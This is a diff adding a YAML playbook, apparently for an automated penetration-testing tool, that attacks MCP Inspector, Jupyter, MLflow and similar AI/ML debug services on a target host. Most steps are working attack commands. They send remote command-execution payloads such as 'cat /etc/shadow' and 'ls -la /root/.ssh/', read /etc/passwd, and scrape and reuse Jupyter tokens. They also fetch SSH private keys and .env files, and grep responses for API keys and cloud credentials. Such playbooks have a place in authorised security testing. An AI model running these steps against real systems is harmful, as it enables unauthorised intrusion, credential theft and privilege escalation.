@@ -1,0 +1,570 @@
+name: "MCP & Debug Service Security Assessment"
+description: >
+  Discover and assess the security of MCP (Model Context Protocol) services,
+  Jupyter notebooks, JupyterLab, MLflow, TensorBoard, and other debug/admin
+  services commonly exposed alongside AI/ML infrastructure. Covers MCP Inspector
+  exposure, unauthenticated Jupyter access, token leakage, environment variable
+  disclosure, SSH key exposure, and privilege escalation via debug tools.
+version: "2.0"
+target_required: true
+
+vars:
+  wordlist: "/wordlists/webcontent-top-10000.txt"
+  callback: ""
+
+preflight:
+  - id: preamble
+    type: log
+    message: "MCP & debug service security assessment — target: {target}, case: {case_id}"
+
+steps:
+  # Phase 1: Port scan for MCP & debug services
+  - id: service_discovery
+    name: "MCP & debug service port discovery"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: nmap_mcp_ports
+        name: "Scan common MCP/debug service ports"
+        tool: nmap
+        args:
+          - "-sS"
+          - "-Pn"
+          - "-p"
+          - "6274,6275,8888,8889,8890,8891,3000,3001,4000,5000,5001,6006,6007,8000,8001,8080,8081,8090,9000,9001,9090,10000"
+          - "--open"
+          - "--min-rate"
+          - "1000"
+          - "-oN"
+          - "{case_dir}/nmap-mcp-ports.txt"
+          - "{target}"
+        timeout: 300
+        artifacts:
+          - "{case_dir}/nmap-mcp-ports.txt"
+
+      - id: nmap_ml_ports
+        name: "Scan ML/AI platform ports"
+        tool: nmap
+        args:
+          - "-sS"
+          - "-Pn"
+          - "-p"
+          - "4201,4501,5005,5010,5011,5100,5101,6000,6001,6379,7000,7001,7070,7071,8002,8008,8501"
+          - "--open"
+          - "--min-rate"
+          - "1000"
+          - "-oN"
+          - "{case_dir}/nmap-ml-ports.txt"
+          - "{target}"
+        timeout: 300
+        artifacts:
+          - "{case_dir}/nmap-ml-ports.txt"
+
+      - id: whatweb
+        name: "Technology fingerprint"
+        tool: whatweb
+        args:
+          - "-a3"
+          - "{target}"
+          - "--log-verbose"
+          - "{case_dir}/whatweb-mcp.txt"
+        timeout: 60
+
+  # Phase 2: MCP Inspector discovery & exploitation
+  - id: mcp_inspector
+    name: "MCP Inspector service assessment"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: mcp_inspector_6274
+        name: "Check MCP Inspector on port 6274"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            RESP=$(curl -sk -w "\\nHTTP: %{http_code} Content-Type: %{content_type}" -o {case_dir}/mcp-inspector-6274.txt "{target}:6274" 2>&1);
+            echo "$RESP" >> {case_dir}/mcp-inspector-6274.txt;
+            echo "" >> {case_dir}/mcp-inspector-6274.txt;
+            echo "=== /api/tools ===" >> {case_dir}/mcp-inspector-6274.txt;
+            curl -sk "{target}:6274/api/tools" -H "Content-Type: application/json" >> {case_dir}/mcp-inspector-6274.txt 2>&1;
+            echo "" >> {case_dir}/mcp-inspector-6274.txt;
+            echo "=== /api/resources ===" >> {case_dir}/mcp-inspector-6274.txt;
+            curl -sk "{target}:6274/api/resources" -H "Content-Type: application/json" >> {case_dir}/mcp-inspector-6274.txt 2>&1;
+            echo "" >> {case_dir}/mcp-inspector-6274.txt;
+            echo "=== /api/prompts ===" >> {case_dir}/mcp-inspector-6274.txt;
+            curl -sk "{target}:6274/api/prompts" -H "Content-Type: application/json" >> {case_dir}/mcp-inspector-6274.txt 2>&1;
+            echo "" >> {case_dir}/mcp-inspector-6274.txt;
+            echo "=== /api/health ===" >> {case_dir}/mcp-inspector-6274.txt;
+            curl -sk "{target}:6274/api/health" >> {case_dir}/mcp-inspector-6274.txt 2>&1;
+            echo "" >> {case_dir}/mcp-inspector-6274.txt;
+            echo "=== /tools/execute (RCE test) ===" >> {case_dir}/mcp-inspector-6274.txt;
+            curl -sk "{target}:6274/tools/execute" -H "Content-Type: application/json" -d '{"tool":"execute_command","args":{"command":"id"}}' >> {case_dir}/mcp-inspector-6274.txt 2>&1;
+            echo "" >> {case_dir}/mcp-inspector-6274.txt;
+            echo "=== /api/execute (RCE test) ===" >> {case_dir}/mcp-inspector-6274.txt;
+            curl -sk "{target}:6274/api/execute" -H "Content-Type: application/json" -d '{"name":"execute","arguments":{"command":"whoami"}}' >> {case_dir}/mcp-inspector-6274.txt 2>&1
+        timeout: 60
+        artifacts:
+          - "{case_dir}/mcp-inspector-6274.txt"
+
+      - id: mcp_inspector_6275
+        name: "Check MCP Inspector on port 6275"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            curl -sk -w "\\nHTTP: %{http_code}" -o {case_dir}/mcp-inspector-6275.txt "{target}:6275" 2>&1;
+            echo "" >> {case_dir}/mcp-inspector-6275.txt;
+            echo "=== /api/tools ===" >> {case_dir}/mcp-inspector-6275.txt;
+            curl -sk "{target}:6275/api/tools" >> {case_dir}/mcp-inspector-6275.txt 2>&1;
+            echo "" >> {case_dir}/mcp-inspector-6275.txt;
+            echo "=== /api/health ===" >> {case_dir}/mcp-inspector-6275.txt;
+            curl -sk "{target}:6275/api/health" >> {case_dir}/mcp-inspector-6275.txt 2>&1
+        timeout: 30
+        artifacts:
+          - "{case_dir}/mcp-inspector-6275.txt"
+
+      - id: mcp_server_probe
+        name: "Probe for MCP server protocol endpoints"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== MCP SSE endpoint ===" > {case_dir}/mcp-server-probe.txt;
+            curl -sk -w " HTTP:%{http_code}" "{target}/mcp" >> {case_dir}/mcp-server-probe.txt 2>&1;
+            echo "" >> {case_dir}/mcp-server-probe.txt;
+            echo "=== MCP WebSocket upgrade ===" >> {case_dir}/mcp-server-probe.txt;
+            curl -sk -H "Upgrade: websocket" -H "Connection: Upgrade" -w " HTTP:%{http_code}" "{target}/mcp" >> {case_dir}/mcp-server-probe.txt 2>&1;
+            echo "" >> {case_dir}/mcp-server-probe.txt;
+            echo "=== SSE on /sse ===" >> {case_dir}/mcp-server-probe.txt;
+            curl -sk -w " HTTP:%{http_code}" "{target}/sse" >> {case_dir}/mcp-server-probe.txt 2>&1;
+            echo "" >> {case_dir}/mcp-server-probe.txt;
+            echo "=== MCP messages endpoint ===" >> {case_dir}/mcp-server-probe.txt;
+            curl -sk -X POST -w " HTTP:%{http_code}" -H "Content-Type: application/json" "{target}/messages" -d '{"jsonrpc":"2.0","id":1,"method":"ping"}' >> {case_dir}/mcp-server-probe.txt 2>&1;
+            echo "" >> {case_dir}/mcp-server-probe.txt;
+            echo "=== MCP tools list ===" >> {case_dir}/mcp-server-probe.txt;
+            curl -sk -X POST -H "Content-Type: application/json" "{target}/messages" -d '{"jsonrpc":"2.0","id":2,"method":"tools/list"}' >> {case_dir}/mcp-server-probe.txt 2>&1
+        timeout: 30
+        artifacts:
+          - "{case_dir}/mcp-server-probe.txt"
+
+      - id: mcp_file_access
+        name: "MCP file read/write tool abuse"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for port in 6274 6275; do
+              echo "=== Port $port: read /etc/passwd ===" >> {case_dir}/mcp-file-access.txt;
+              curl -sk "{target}:$port/tools/execute" -H "Content-Type: application/json" -d '{"tool":"read","args":{"path":"/etc/passwd"}}' >> {case_dir}/mcp-file-access.txt 2>&1;
+              echo "" >> {case_dir}/mcp-file-access.txt;
+              curl -sk "{target}:$port/api/execute" -H "Content-Type: application/json" -d '{"name":"read_file","arguments":{"path":"/etc/passwd"}}' >> {case_dir}/mcp-file-access.txt 2>&1;
+              echo "" >> {case_dir}/mcp-file-access.txt;
+            done
+        timeout: 30
+        artifacts:
+          - "{case_dir}/mcp-file-access.txt"
+
+  # Phase 3: Jupyter discovery & exploitation
+  - id: jupyter_scan
+    name: "Jupyter Notebook / JupyterLab assessment"
+    type: parallel
+    max_workers: 5
+    steps:
+      - id: jupyter_8888
+        name: "Check Jupyter on port 8888"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            curl -sk -w "\\nHTTP: %{http_code} Content-Type: %{content_type}" -o {case_dir}/jupyter-8888.txt "{target}:8888" 2>&1;
+            echo "" >> {case_dir}/jupyter-8888.txt;
+            echo "=== /api/contents ===" >> {case_dir}/jupyter-8888.txt;
+            curl -sk "{target}:8888/api/contents" >> {case_dir}/jupyter-8888.txt 2>&1;
+            echo "" >> {case_dir}/jupyter-8888.txt;
+            echo "=== /api/kernels ===" >> {case_dir}/jupyter-8888.txt;
+            curl -sk "{target}:8888/api/kernels" >> {case_dir}/jupyter-8888.txt 2>&1;
+            echo "" >> {case_dir}/jupyter-8888.txt;
+            echo "=== /api/sessions ===" >> {case_dir}/jupyter-8888.txt;
+            curl -sk "{target}:8888/api/sessions" >> {case_dir}/jupyter-8888.txt 2>&1;
+            echo "" >> {case_dir}/jupyter-8888.txt;
+            echo "=== /api/terminals ===" >> {case_dir}/jupyter-8888.txt;
+            curl -sk "{target}:8888/api/terminals" >> {case_dir}/jupyter-8888.txt 2>&1;
+            echo "" >> {case_dir}/jupyter-8888.txt;
+            echo "=== /tree (file browser) ===" >> {case_dir}/jupyter-8888.txt;
+            curl -sk "{target}:8888/tree" >> {case_dir}/jupyter-8888.txt 2>&1;
+            echo "" >> {case_dir}/jupyter-8888.txt;
+            echo "=== /login ===" >> {case_dir}/jupyter-8888.txt;
+            curl -sk "{target}:8888/login" >> {case_dir}/jupyter-8888.txt 2>&1
+        timeout: 60
+        artifacts:
+          - "{case_dir}/jupyter-8888.txt"
+
+      - id: jupyter_lab
+        name: "Check JupyterLab on common ports"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for port in 8888 8889 8890 8891; do
+              echo "=== Port $port: /lab ===" >> {case_dir}/jupyter-lab.txt;
+              curl -sk -w " HTTP:%{http_code}" "{target}:$port/lab" >> {case_dir}/jupyter-lab.txt 2>&1;
+              echo "" >> {case_dir}/jupyter-lab.txt;
+            done
+        timeout: 60
+        artifacts:
+          - "{case_dir}/jupyter-lab.txt"
+
+      - id: jupyter_token_leak
+        name: "Jupyter token discovery"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== Attempting token discovery ===" > {case_dir}/jupyter-tokens.txt;
+            for port in 8888 8889; do
+              echo "--- Port $port ---" >> {case_dir}/jupyter-tokens.txt;
+              curl -sk "{target}:$port/tree" | grep -oiE 'token=[a-zA-Z0-9]+|\\?token=[a-zA-Z0-9]+' >> {case_dir}/jupyter-tokens.txt 2>&1;
+              curl -sk "{target}:$port/api/contents" -H "Authorization: token $(curl -sk "{target}:$port/tree" 2>/dev/null | grep -oE 'token=[a-zA-Z0-9]+' | head -1 | cut -d= -f2)" >> {case_dir}/jupyter-tokens.txt 2>&1;
+            done
+        timeout: 30
+        artifacts:
+          - "{case_dir}/jupyter-tokens.txt"
+
+      - id: jupyter_env_dump
+        name: "Jupyter environment variable dump"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            if grep -q "200\|200 OK\|20[0-9]" {case_dir}/jupyter-8888.txt 2>/dev/null; then
+              echo "=== Try to execute env dump via notebook ===" > {case_dir}/jupyter-env.txt;
+              curl -sk "{target}:8888/api/contents" -H "Content-Type: application/json" >> {case_dir}/jupyter-env.txt 2>&1;
+              echo "" >> {case_dir}/jupyter-env.txt;
+              echo "=== Check for .env files ===" >> {case_dir}/jupyter-env.txt;
+              curl -sk "{target}:8888/api/contents/.env" >> {case_dir}/jupyter-env.txt 2>&1;
+              echo "" >> {case_dir}/jupyter-env.txt;
+              echo "=== Check environment ===" >> {case_dir}/jupyter-env.txt;
+              curl -sk "{target}:8888/api/contents/environment" >> {case_dir}/jupyter-env.txt 2>&1;
+            else
+              echo "Jupyter not accessible on 8888" > {case_dir}/jupyter-env.txt;
+            fi
+        timeout: 30
+        artifacts:
+          - "{case_dir}/jupyter-env.txt"
+
+      - id: jupyter_rce
+        name: "Jupyter RCE via kernel execution"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== Testing RCE via Jupyter API ===" > {case_dir}/jupyter-rce.txt;
+            for port in 8888 8889; do
+              echo "--- Port $port ---" >> {case_dir}/jupyter-rce.txt;
+              curl -sk "{target}:$port/api/kernels" -H "Content-Type: application/json" >> {case_dir}/jupyter-rce.txt 2>&1;
+              echo "" >> {case_dir}/jupyter-rce.txt;
+            done
+        timeout: 30
+        artifacts:
+          - "{case_dir}/jupyter-rce.txt"
+
+  # Phase 4: MLflow & ML platform services
+  - id: ml_platform
+    name: "MLflow / ML service discovery"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: mlflow_check
+        name: "MLflow tracking server detection"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for port in 5000 5001 5002 5010; do
+              echo "=== Port $port ===" >> {case_dir}/mlflow-check.txt;
+              curl -sk -w " HTTP:%{http_code}" "{target}:$port/" >> {case_dir}/mlflow-check.txt 2>&1;
+              echo "" >> {case_dir}/mlflow-check.txt;
+              curl -sk "{target}:$port/api/2.0/mlflow/experiments/list" >> {case_dir}/mlflow-check.txt 2>&1;
+              echo "" >> {case_dir}/mlflow-check.txt;
+            done
+        timeout: 60
+        artifacts:
+          - "{case_dir}/mlflow-check.txt"
+
+      - id: tensorboard_check
+        name: "TensorBoard detection"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for port in 6006 6007 6008; do
+              echo "=== Port $port ===" >> {case_dir}/tensorboard-check.txt;
+              curl -sk -w " HTTP:%{http_code}" "{target}:$port/" >> {case_dir}/tensorboard-check.txt 2>&1;
+              echo "" >> {case_dir}/tensorboard-check.txt;
+              curl -sk "{target}:$port/data/logdir" >> {case_dir}/tensorboard-check.txt 2>&1;
+              echo "" >> {case_dir}/tensorboard-check.txt;
+            done
+        timeout: 60
+        artifacts:
+          - "{case_dir}/tensorboard-check.txt"
+
+      - id: openai_proxy
+        name: "OpenAI proxy / LLM endpoint discovery"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for port in 3000 4000 8000 8080 9000; do
+              echo "=== Port $port: /v1/chat/completions ===" >> {case_dir}/llm-endpoints.txt;
+              curl -sk -w " HTTP:%{http_code}" -X POST "{target}:$port/v1/chat/completions" -H "Content-Type: application/json" -d '{"model":"test","messages":[{"role":"user","content":"hi"}]}' >> {case_dir}/llm-endpoints.txt 2>&1;
+              echo "" >> {case_dir}/llm-endpoints.txt;
+              echo "=== Port $port: /v1/models ===" >> {case_dir}/llm-endpoints.txt;
+              curl -sk -w " HTTP:%{http_code}" "{target}:$port/v1/models" >> {case_dir}/llm-endpoints.txt 2>&1;
+              echo "" >> {case_dir}/llm-endpoints.txt;
+            done
+        timeout: 120
+        artifacts:
+          - "{case_dir}/llm-endpoints.txt"
+
+      - id: huggingface_check
+        name: "HuggingFace endpoint discovery"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for port in 8000 8001 8002 8080 8081; do
+              echo "=== Port $port ===" >> {case_dir}/huggingface-check.txt;
+              curl -sk -w " HTTP:%{http_code}" "{target}:$port/" >> {case_dir}/huggingface-check.txt 2>&1;
+              echo "" >> {case_dir}/huggingface-check.txt;
+              curl -sk "{target}:$port/docs" >> {case_dir}/huggingface-check.txt 2>&1;
+              echo "" >> {case_dir}/huggingface-check.txt;
+            done
+        timeout: 60
+
+  # Phase 5: Debug & admin tool discovery
+  - id: debug_tools
+    name: "Debug & admin tool discovery"
+    type: parallel
+    max_workers: 5
+    steps:
+      - id: common_admin_paths
+        name: "Fuzz for common admin/debug paths"
+        tool: ffuf
+        args:
+          - "-u"
+          - "http://{target}:8080/FUZZ"
+          - "-w"
+          - "{wordlist}"
+          - "-mc"
+          - "200,401,403,500"
+          - "-o"
+          - "{case_dir}/ffuf-admin-paths.json"
+          - "-of"
+          - "json"
+          - "-ac"
+        timeout: 120
+        artifacts:
+          - "{case_dir}/ffuf-admin-paths.json"
+
+      - id: expose_check
+        name: "Check for info exposure on found services"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for port in 6274 6275 8888 8889 5000 6006 8000 8080 9000 3000; do
+              echo "=== Port $port ===" >> {case_dir}/service-exposure.txt;
+              curl -sk -w " HTTP:%{http_code} Len:%{size_download}" "{target}:$port/robots.txt" >> {case_dir}/service-exposure.txt 2>&1;
+              echo "" >> {case_dir}/service-exposure.txt;
+              curl -sk -w " HTTP:%{http_code}" "{target}:$port/.env" >> {case_dir}/service-exposure.txt 2>&1;
+              echo "" >> {case_dir}/service-exposure.txt;
+              curl -sk -w " HTTP:%{http_code}" "{target}:$port/debug" >> {case_dir}/service-exposure.txt 2>&1;
+              echo "" >> {case_dir}/service-exposure.txt;
+              curl -sk -w " HTTP:%{http_code}" "{target}:$port/health" >> {case_dir}/service-exposure.txt 2>&1;
+              echo "" >> {case_dir}/service-exposure.txt;
+              curl -sk -w " HTTP:%{http_code}" "{target}:$port/metrics" >> {case_dir}/service-exposure.txt 2>&1;
+              echo "" >> {case_dir}/service-exposure.txt;
+            done
+        timeout: 120
+        artifacts:
+          - "{case_dir}/service-exposure.txt"
+
+      - id: dev_headers
+        name: "Check for debug headers / server info"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            for port in 80 443 8080 8443 3000 5000; do
+              echo "=== Port $port ===" >> {case_dir}/debug-headers.txt;
+              curl -skI "{target}:$port" >> {case_dir}/debug-headers.txt 2>&1;
+              echo "" >> {case_dir}/debug-headers.txt;
+            done
+        timeout: 60
+        artifacts:
+          - "{case_dir}/debug-headers.txt"
+
+      - id: verify_is_debug
+        name: "Check for debug mode strings in responses"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== Checking for debug indicators ===" > {case_dir}/debug-indicators.txt;
+            for port in 80 443 8080 8443 3000 5000 8000; do
+              echo "--- Port $port ---" >> {case_dir}/debug-indicators.txt;
+              curl -sk "{target}:$port" 2>/dev/null | grep -oiE '(debug|stack trace|traceback|error on line|warning|deprecated|development mode|app debug|laravel debug|symfony debug|flask debug|django debug|node_env=development|next dev|vite dev|webpack dev|source-map|eval-source-map)' | sort -u >> {case_dir}/debug-indicators.txt 2>&1;
+            done
+        timeout: 60
+        artifacts:
+          - "{case_dir}/debug-indicators.txt"
+
+  # Phase 6: SSH key & credential discovery (post-exploitation pivot)
+  - id: credential_leak
+    name: "Credential & key exposure assessment"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: ssh_key_discovery
+        name: "Discover exposed SSH keys"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== Searching for SSH keys ===" > {case_dir}/ssh-keys-found.txt;
+            for port in 6274 6275 8888 8889 8080 3000; do
+              echo "--- Port $port ---" >> {case_dir}/ssh-keys-found.txt;
+              curl -sk "{target}:$port/id_rsa" -w " HTTP:%{http_code}" >> {case_dir}/ssh-keys-found.txt 2>&1;
+              echo "" >> {case_dir}/ssh-keys-found.txt;
+              curl -sk "{target}:$port/.ssh/id_rsa" -w " HTTP:%{http_code}" >> {case_dir}/ssh-keys-found.txt 2>&1;
+              echo "" >> {case_dir}/ssh-keys-found.txt;
+              curl -sk "{target}:$port/.ssh/authorized_keys" -w " HTTP:%{http_code}" >> {case_dir}/ssh-keys-found.txt 2>&1;
+              echo "" >> {case_dir}/ssh-keys-found.txt;
+            done
+        timeout: 60
+        artifacts:
+          - "{case_dir}/ssh-keys-found.txt"
+
+      - id: api_key_search
+        name: "Search for API keys in exposed pages"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== API key pattern search ===" > {case_dir}/api-keys-found.txt;
+            for port in 6274 6275 8888 8889; do
+              echo "--- Port $port ---" >> {case_dir}/api-keys-found.txt;
+              curl -sk "{target}:$port/" 2>/dev/null | grep -oiE '(api[_-]?key|sk-[a-zA-Z0-9]{20,}|AIza[A-Za-z0-9_-]{35}|ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{50,}|AKIA[0-9A-Z]{16}|eyJ[a-zA-Z0-9_-]{20,}\\.eyJ|-----BEGIN (RSA|OPENSSH) )' | sort -u >> {case_dir}/api-keys-found.txt 2>&1;
+            done
+        timeout: 60
+        artifacts:
+          - "{case_dir}/api-keys-found.txt"
+
+      - id: env_var_search
+        name: "Search for environment variables"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== Environment variable search ===" > {case_dir}/env-vars-found.txt;
+            for port in 6274 6275 8888 8889; do
+              echo "--- Port $port ---" >> {case_dir}/env-vars-found.txt;
+              curl -sk "{target}:$port/" 2>/dev/null | grep -oiE '(SECRET|TOKEN|PASSWORD|PASSWD|CREDENTIAL|DATABASE_URL|REDIS_URL|SUPABASE|STRIPE|AWS_SECRET|AZURE|OPENAI|ANTHROPIC|SENDGRID|TWILIO|JWT_SECRET|SESSION_SECRET)[=:].{0,80}' | sort -u >> {case_dir}/env-vars-found.txt 2>&1;
+            done
+        timeout: 60
+        artifacts:
+          - "{case_dir}/env-vars-found.txt"
+
+  # Phase 7: Privilege escalation checks
+  - id: privesc_check
+    name: "Privilege escalation vector assessment"
+    type: sequential
+    steps:
+      - id: from_mcp_dev
+        name: "Check MCP service for pivot/SSH vectors"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== Check for SSH keys accessible via MCP ===" > {case_dir}/privesc-mcp.txt;
+            for port in 6274 6275; do
+              echo "--- Port $port ---" >> {case_dir}/privesc-mcp.txt;
+              curl -sk "{target}:$port/tools/execute" -H "Content-Type: application/json" -d '{"tool":"read","args":{"path":"/home/"}}' >> {case_dir}/privesc-mcp.txt 2>&1;
+              echo "" >> {case_dir}/privesc-mcp.txt;
+              curl -sk "{target}:$port/tools/execute" -H "Content-Type: application/json" -d '{"tool":"execute_command","args":{"command":"cat /etc/shadow"}}' >> {case_dir}/privesc-mcp.txt 2>&1;
+              echo "" >> {case_dir}/privesc-mcp.txt;
+              curl -sk "{target}:$port/tools/execute" -H "Content-Type: application/json" -d '{"tool":"execute_command","args":{"command":"ls -la /root/.ssh/"}}' >> {case_dir}/privesc-mcp.txt 2>&1;
+              echo "" >> {case_dir}/privesc-mcp.txt;
+            done
+        timeout: 60
+        artifacts:
+          - "{case_dir}/privesc-mcp.txt"
+
+      - id: from_jupyter
+        name: "Check Jupyter for privilege escalation"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== Checking Jupyter for sudo/persistence vectors ===" > {case_dir}/privesc-jupyter.txt;
+            if grep -q "200" {case_dir}/jupyter-8888.txt 2>/dev/null; then
+              curl -sk "{target}:8888/api/contents/etc/sudoers" >> {case_dir}/privesc-jupyter.txt 2>&1;
+              echo "" >> {case_dir}/privesc-jupyter.txt;
+              curl -sk "{target}:8888/api/contents/root/.ssh" >> {case_dir}/privesc-jupyter.txt 2>&1;
+            fi
+        timeout: 30
+        artifacts:
+          - "{case_dir}/privesc-jupyter.txt"
+
+  # Phase 8: Report
+  - id: report
+    name: "MCP & debug service security report"
+    type: report
+    format: markdown
+    title: "MCP & Debug Service Security Report — {target}"
+    output: "{case_dir}/mcp-security-report.md"
+    sections:
+      - heading: "Target"
+        body: "- Target: {target}"
+      - heading: "Service Discovery"
+        body: "- MCP/debug port scan: {case_dir}/nmap-mcp-ports.txt\n- ML/AI port scan: {case_dir}/nmap-ml-ports.txt\n- Technology: {case_dir}/whatweb-mcp.txt"
+      - heading: "MCP Inspector"
+        body: "- Port 6274: {case_dir}/mcp-inspector-6274.txt\n- Port 6275: {case_dir}/mcp-inspector-6275.txt\n- Server probe: {case_dir}/mcp-server-probe.txt\n- File access: {case_dir}/mcp-file-access.txt"
+      - heading: "Jupyter"
+        body: "- Port 8888: {case_dir}/jupyter-8888.txt\n- JupyterLab: {case_dir}/jupyter-lab.txt\n- Token discovery: {case_dir}/jupyter-tokens.txt\n- Environment: {case_dir}/jupyter-env.txt\n- RCE attempt: {case_dir}/jupyter-rce.txt"
+      - heading: "ML Platforms"
+        body: "- MLflow: {case_dir}/mlflow-check.txt\n- TensorBoard: {case_dir}/tensorboard-check.txt\n- LLM endpoints: {case_dir}/llm-endpoints.txt\n- HuggingFace: {case_dir}/huggingface-check.txt"
+      - heading: "Debug Tools"
+        body: "- Admin path fuzz: {case_dir}/ffuf-admin-paths.json\n- Service exposure: {case_dir}/service-exposure.txt\n- Debug headers: {case_dir}/debug-headers.txt\n- Debug indicators: {case_dir}/debug-indicators.txt"
+      - heading: "Credentials & Keys"
+        body: "- SSH keys: {case_dir}/ssh-keys-found.txt\n- API keys: {case_dir}/api-keys-found.txt\n- Environment variables: {case_dir}/env-vars-found.txt"
+      - heading: "Privilege Escalation"
+        body: "- MCP pivot vectors: {case_dir}/privesc-mcp.txt\n- Jupyter privesc: {case_dir}/privesc-jupyter.txt"
+
+postflight:
+  - id: critical_notify
+    type: conditional
+    condition:
+      or:
+        - on_match:"MCP"
+        - on_match:"Jupyter"
+        - on_match:"MLflow"
+    then:
+      - id: crit_alert
+        type: notify
+        level: critical
+        message: >
+          MCP/debug service found — check reports in {case_dir}/mcp-security-report.md
+          for unauthenticated access and credential exposure vectors
+    else:
+      - id: ok_log
+        type: log
+        message: "No MCP or debug services found on common ports"
+
+  - id: cleanup
+    type: log
+    message: "MCP service assessment complete — report at {case_dir}/mcp-security-report.md"
+  - id: notify_done
+    type: notify
+    level: success
+    message: "MCP & debug service security scan finished for {target}. Results in {case_dir}"
